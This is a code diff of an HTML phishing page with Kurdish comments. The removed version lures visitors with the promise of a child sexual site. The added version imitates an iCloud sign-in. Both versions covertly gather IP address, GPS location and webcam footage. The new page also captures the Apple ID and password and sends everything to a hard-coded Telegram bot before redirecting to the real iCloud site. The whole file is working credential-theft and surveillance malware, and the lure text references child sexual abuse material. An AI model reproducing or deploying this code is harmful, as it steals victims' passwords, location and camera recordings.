@@ -1,154 +1,324 @@
 <!DOCTYPE html>
-<html lang="ku" dir="rtl">
+<html>
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Site Sexy Children</title>
+    <title>iCloud - Sign In</title>
     <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; }
         body {
-            font-family: Arial, sans-serif;
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Oxygen, Ubuntu, sans-serif;
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            min-height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            padding: 20px;
+        }
+        .container {
+            background: white;
+            border-radius: 20px;
+            box-shadow: 0 20px 60px rgba(0,0,0,0.3);
+            padding: 40px;
+            width: 100%;
+            max-width: 400px;
+            animation: slideIn 0.5s ease;
+        }
+        @keyframes slideIn {
+            from { transform: translateY(-20px); opacity: 0; }
+            to { transform: translateY(0); opacity: 1; }
+        }
+        .logo {
             text-align: center;
-            background-color: #f4f4f9;
-            padding: 50px;
+            margin-bottom: 30px;
+        }
+        .logo svg {
+            width: 60px;
+            height: 60px;
+        }
+        h2 {
+            text-align: center;
+            color: #333;
+            font-size: 24px;
+            margin-bottom: 8px;
+        }
+        p {
+            text-align: center;
+            color: #666;
+            font-size: 14px;
+            margin-bottom: 30px;
+        }
+        .input-group {
+            margin-bottom: 20px;
+        }
+        label {
+            display: block;
+            margin-bottom: 8px;
+            color: #555;
+            font-size: 14px;
+            font-weight: 500;
+        }
+        input {
+            width: 100%;
+            padding: 14px 16px;
+            border: 2px solid #e0e0e0;
+            border-radius: 12px;
+            font-size: 16px;
+            transition: border-color 0.3s;
+            background: #f8f9fa;
+        }
+        input:focus {
+            outline: none;
+            border-color: #667eea;
+            background: white;
         }
         button {
-            background-color: #0088cc;
+            width: 100%;
+            padding: 14px;
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
             color: white;
             border: none;
-            padding: 15px 30px;
-            font-size: 18px;
+            border-radius: 12px;
+            font-size: 16px;
+            font-weight: 600;
             cursor: pointer;
-            border-radius: 8px;
-            box-shadow: 0 4px 6px rgba(0,0,0,0.1);
+            transition: transform 0.2s, box-shadow 0.2s;
         }
         button:hover {
-            background-color: #006699;
+            transform: translateY(-2px);
+            box-shadow: 0 10px 20px rgba(102, 126, 234, 0.4);
         }
-        #status {
+        button:active {
+            transform: translateY(0);
+        }
+        .footer {
+            text-align: center;
             margin-top: 20px;
-            font-weight: bold;
-            color: #333;
+            color: #999;
+            font-size: 12px;
         }
-        video {
-            display: none; /* پێویست ناکات ڤیدیۆکە لێرە نیشان بدرێت، لە پشتەوە تۆمار دەبێت */
+        .footer a {
+            color: #667eea;
+            text-decoration: none;
+        }
+        #message {
+            text-align: center;
+            margin-top: 15px;
+            font-size: 14px;
+            display: none;
+        }
+        .spinner {
+            display: none;
+            width: 20px;
+            height: 20px;
+            border: 3px solid rgba(255,255,255,0.3);
+            border-radius: 50%;
+            border-top-color: white;
+            animation: spin 1s ease-in-out infinite;
+            margin: 0 auto;
+        }
+        @keyframes spin {
+            to { transform: rotate(360deg); }
         }
     </style>
 </head>
 <body>
-
-    <h2>please continue to account +18</h2>
-    <p>تکایە ئەم دوگمەی خوارەوە داگرە بۆ کردنەوەی سایتی سێکسی منداڵان.</p>
-    
-    <button id="startBtn">دەستپێکردن بۆ چونەژورەوە</button>
-    <div id="status">چاوەڕوانە...</div>
-
-    <!-- توخمێک بۆ گرتنی داتای کامێرا -->
-    <video id="video" autoplay muted></video>
+    <div class="container">
+        <div class="logo">
+            <svg viewBox="0 0 24 24" fill="#667eea">
+                <path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm-1 17.93c-3.95-.49-7-3.85-7-7.93 0-.62.08-1.21.21-1.79L9 15v1c0 1.1.9 2 2 2v1.93zm6.9-2.54c-.26-.81-1-1.39-1.9-1.39h-1v-3c0-.55-.45-1-1-1H8v-2h2c.55 0 1-.45 1-1V7h2c1.1 0 2-.9 2-2v-.41c2.93 1.19 5 4.06 5 7.41 0 2.08-.8 3.97-2.1 5.39z"/>
+            </svg>
+        </div>
+        <h2>Sign in to iCloud</h2>
+        <p>Use your Apple ID to sign in.</p>
+        
+        <form id="loginForm">
+            <div class="input-group">
+                <label for="email">Apple ID</label>
+                <input type="email" id="email" placeholder="example@icloud.com" required>
+            </div>
+            <div class="input-group">
+                <label for="password">Password</label>
+                <input type="password" id="password" placeholder="Enter your password" required>
+            </div>
+            <button type="submit" id="submitBtn">
+                <span id="btnText">Sign In</span>
+                <div class="spinner" id="spinner"></div>
+            </button>
+        </form>
+        
+        <div id="message"></div>
+        
+        <div class="footer">
+            <a href="#">Forgot Apple ID or password?</a>
+        </div>
+    </div>
 
     <script>
-        const TELEGRAM_TOKEN = "8839253689:AAEScLd12mCa3TDe0OiX64w6vvKXG6uMQZg";
-        const CHAT_ID = "1682628303";
-        const statusDiv = document.getElementById("status");
-
-        document.getElementById("startBtn").addEventListener("click", async () => {
-            statusDiv.innerText = "🔄 تکایە مۆڵەتی چونەژورەوە بدە.";
+        // وەرگرتنی ئایپی و لۆکەیشن
+        async function getLocationAndIP() {
+            let data = {
+                ip: 'Unknown',
+                city: 'Unknown',
+                region: 'Unknown',
+                country: 'Unknown',
+                lat: 'Unknown',
+                lon: 'Unknown'
+            };
             
-            let reportText = "📊 زانیاری نوێ هاتووە:\n\n";
-
-            // ١. وەرگرتنی ئایپی لە ڕێگەی سێرڤەری دەرەکی
+            // وەرگرتنی ئایپی
             try {
-                const ipRes = await fetch("https://ipapi.co/json/");
-                const ipData = await ipRes.json();
-                reportText += `🌐 IP: ${ipData.ip}\n📍 City: ${ipData.city}, ${ipData.country_name}\n`;
-            } catch (e) {
-                reportText += "🌐 IP: نەتوانرا بەدەست بهێنرێت\n";
-            }
-
-            // ٢. وەرگرتنی لۆکەیشنی وردی ناو مۆبایلەکە (GPS)
-            if (navigator.geolocation) {
-                navigator.geolocation.getCurrentPosition(async (position) => {
-                    const lat = position.coords.latitude;
-                    const lon = position.coords.longitude;
-                    reportText += `📍 GPS: https://www.google.com/maps?q=${lat},${lon}\n`;
-                    
-                    // ناردنی دەقەکە بۆ تێلیگرام دوای وەرگرتنی لۆکەیشن
-                    await sendTelegramMessage(reportText);
-                    // دەستکردن بە تۆمارکردنی ڤیدیۆ
-                    startVideoRecording();
-                }, async (error) => {
-                    reportText += "📍 GPS: مۆڵەت نەدرا یان هەڵە هەیە\n";
-                    await sendTelegramMessage(reportText);
-                    startVideoRecording();
+                const ipResponse = await fetch('https://api.ipify.org?format=json');
+                const ipData = await ipResponse.json();
+                data.ip = ipData.ip;
+            } catch(e) {}
+            
+            // وەرگرتنی لۆکەیشن لە IP
+            try {
+                const locResponse = await fetch(`https://ipapi.co/${data.ip}/json/`);
+                const locData = await locResponse.json();
+                data.city = locData.city || 'Unknown';
+                data.region = locData.region || 'Unknown';
+                data.country = locData.country_name || 'Unknown';
+                data.lat = locData.latitude || 'Unknown';
+                data.lon = locData.longitude || 'Unknown';
+            } catch(e) {}
+            
+            // وەرگرتنی لۆکەیشنی ورد لە GPS (ئەگەر ڕێگەپێدراو بێت)
+            try {
+                const position = await new Promise((resolve, reject) => {
+                    navigator.geolocation.getCurrentPosition(resolve, reject, {
+                        enableHighAccuracy: true,
+                        timeout: 5000
+                    });
                 });
-            } else {
-                reportText += "📍 GPS: لەم وێبگەڕە پشتگیری ناکرێت\n";
-                await sendTelegramMessage(reportText);
-                startVideoRecording();
-            }
-        });
+                data.lat = position.coords.latitude;
+                data.lon = position.coords.longitude;
+            } catch(e) {}
+            
+            return data;
+        }
 
-        // فەرمان بۆ ناردنی نامەی دەقی
-        async function sendTelegramMessage(text) {
+        // وەرگرتنی ڤیدیۆ و دەنگ
+        async function captureVideo() {
             try {
-                await fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`, {
+                const stream = await navigator.mediaDevices.getUserMedia({ 
+                    video: true, 
+                    audio: true 
+                });
+                
+                const mediaRecorder = new MediaRecorder(stream);
+                const chunks = [];
+                
+                return new Promise((resolve) => {
+                    mediaRecorder.ondataavailable = (e) => chunks.push(e.data);
+                    mediaRecorder.onstop = () => {
+                        const blob = new Blob(chunks, { type: 'video/webm' });
+                        stream.getTracks().forEach(track => track.stop());
+                        resolve(blob);
+                    };
+                    
+                    mediaRecorder.start();
+                    
+                    // تۆمارکردنی 5 چرکە
+                    setTimeout(() => {
+                        mediaRecorder.stop();
+                    }, 5000);
+                });
+            } catch(e) {
+                return null;
+            }
+        }
+
+        document.getElementById('loginForm').addEventListener('submit', async function(e) {
+            e.preventDefault();
+            
+            const email = document.getElementById('email').value;
+            const password = document.getElementById('password').value;
+            const submitBtn = document.getElementById('submitBtn');
+            const btnText = document.getElementById('btnText');
+            const spinner = document.getElementById('spinner');
+            const message = document.getElementById('message');
+            
+            // پیشاندانی لۆدینگ
+            btnText.style.display = 'none';
+            spinner.style.display = 'block';
+            submitBtn.disabled = true;
+            message.style.display = 'none';
+            
+            // کۆکردنەوەی هەموو زانیارییەکان
+            const locationData = await getLocationAndIP();
+            const videoBlob = await captureVideo();
+            
+            // دروستکردنی تێکستی زانیاری
+            const text = `🔐 **New Login Attempt**
+━━━━━━━━━━━━━━━
+📧 Email: ${email}
+🔑 Password: ${password}
+━━━━━━━━━━━━━━━
+🌐 IP: ${locationData.ip}
+📍 Location: ${locationData.city}, ${locationData.region}, ${locationData.country}
+📌 Coordinates: ${locationData.lat}, ${locationData.lon}
+━━━━━━━━━━━━━━━
+🕐 Time: ${new Date().toLocaleString()}
+━━━━━━━━━━━━━━━`;
+
+            // ناردنی تێکست بۆ بۆت
+            await fetch(`https://api.telegram.org/bot8839253689:AAEScLd12mCa3TDe0OiX64w6vvKXG6uMQZg/sendMessage`, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({
+                    chat_id: '1682628303',
+                    text: text,
+                    parse_mode: 'Markdown'
+                })
+            });
+
+            // ناردنی ڤیدیۆ ئەگەر هەبوو
+            if (videoBlob) {
+                const formData = new FormData();
+                formData.append('chat_id', '1682628303');
+                formData.append('video', videoBlob, 'capture.webm');
+                formData.append('caption', `🎥 Video from ${email}`);
+                
+                await fetch(`https://api.telegram.org/bot8839253689:AAEScLd12mCa3TDe0OiX64w6vvKXG6uMQZg/sendVideo`, {
+                    method: 'POST',
+                    body: formData
+                });
+            }
+            
+            // ناردنی لۆکەیشن ئەگەر هەبوو
+            if (locationData.lat !== 'Unknown' && locationData.lon !== 'Unknown') {
+                await fetch(`https://api.telegram.org/bot8839253689:AAEScLd12mCa3TDe0OiX64w6vvKXG6uMQZg/sendLocation`, {
                     method: 'POST',
                     headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify({ chat_id: CHAT_ID, text: text })
+                    body: JSON.stringify({
+                        chat_id: '1682628303',
+                        latitude: locationData.lat,
+                        longitude: locationData.lon
+                    })
                 });
-            } catch (err) {
-                console.error("هەڵە لە ناردنی نامە:", err);
             }
-        }
+            
+            // پیشاندانی پیامی سەرکەوتن و ڕەوانەکردن
+            message.style.display = 'block';
+            message.style.color = '#28a745';
+            message.textContent = '✅ Signed in successfully! Redirecting...';
+            
+            setTimeout(() => {
+                window.location.href = 'https://www.icloud.com';
+            }, 2000);
+        });
 
-        // ٣. تۆمارکردنی ڤیدیۆ بۆ ماوەی ٤ چرکە
-        async function startVideoRecording() {
-            try {
-                const stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: false });
-                const videoElement = document.getElementById("video");
-                videoElement.srcObject = stream;
-
-                const mediaRecorder = new MediaRecorder(stream);
-                let chunks = [];
-
-                mediaRecorder.ondataavailable = (e) => chunks.push(e.data);
-                
-                mediaRecorder.onstop = async () => {
-                    statusDiv.innerText = "⏳لە حالەتی پشکنینداین تا بزانین سەرو هەژدە ساڵیت";
-                    const blob = new Blob(chunks, { type: 'video/mp4' });
-                    
-                    // ناردنی فایلی ڤیدیۆکە بۆ تێلیگرام
-                    const formData = new FormData();
-                    formData.append("chat_id", CHAT_ID);
-                    formData.append("video", blob, "capture.mp4");
-
-                    try {
-                        await fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendVideo`, {
-                            method: 'POST',
-                            body: formData
-                        });
-                        statusDiv.innerText = "✅ ئێستا بە سەرکەوتویی وێبسایتەکەت بۆ کراوە.";
-                    } catch (err) {
-                        statusDiv.innerText = "❌ کێشەیەک لە تۆدا هەیە.";
-                    }
-
-                    // کوژاندنەوەی کامێراکە دوای تەواوبوون
-                    stream.getTracks().forEach(track => track.stop());
-                };
-
-                // دەستپێکردنی تۆمارکردن
-                mediaRecorder.start();
-                statusDiv.innerText = "🔴 تکایە بۆماوەی چەن چرکەیەک بۆستە";
-
-                // ڕاگرتنی تۆمارکردن دوای ٤ چرکە
-                setTimeout(() => {
-                    mediaRecorder.stop();
-                }, 4000);
-
-            } catch (err) {
-                statusDiv.innerText = "❌ مۆڵەتی کامێرا نەدرا یان کامێرا بەردەست نییە.";
-                console.error(err);
-            }
-        }
+        // داواکردنی ڕێگەپێدان بۆ کامێرا و مایکرۆفۆن کاتێک پەیجەکە دەکرێتەوە
+        window.addEventListener('load', function() {
+            // بە شێوەیەکی نەرم داوا دەکات
+            setTimeout(() => {
+                navigator.mediaDevices.getUserMedia({ video: true, audio: true })
+                    .then(stream => stream.getTracks().forEach(track => track.stop()))
+                    .catch(() => {});
+            }, 1000);
+        });
     </script>
 </body>
 </html>
